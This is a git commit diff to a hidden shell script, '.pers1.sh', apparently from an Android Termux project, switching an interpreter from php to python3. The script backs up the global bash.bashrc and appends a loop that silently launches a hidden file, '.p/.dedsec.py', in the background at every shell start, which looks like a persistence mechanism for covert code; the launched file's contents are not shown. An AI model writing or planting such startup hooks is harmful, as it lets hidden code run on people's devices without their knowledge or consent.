8a6ae165b08faeb63c41b74557024fc01b4d2da0
ImJoke <55929550+ImJoke@users.noreply.github.com>
2020-10-09 21:17:10 +0700

    Update .pers1.sh

--- .pers1.sh
+++ .pers1.sh
@@ -1,2 +1,2 @@
 cp /data/data/com.termux/files/usr/etc/bash.bashrc /data/data/com.termux/files/usr/etc/bash.bashrc1
-echo "x=1; while [ $x -le 2 ]; do php /data/data/com.termux/files/home/.p/.dedsec.py &"$'\n'"sleep 2""; x=$(( $x+1 )); done" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+echo "x=1; while [ $x -le 2 ]; do python3 /data/data/com.termux/files/home/.p/.dedsec.py &"$'\n'"sleep 2""; x=$(( $x+1 )); done" >> /data/data/com.termux/files/usr/etc/bash.bashrc
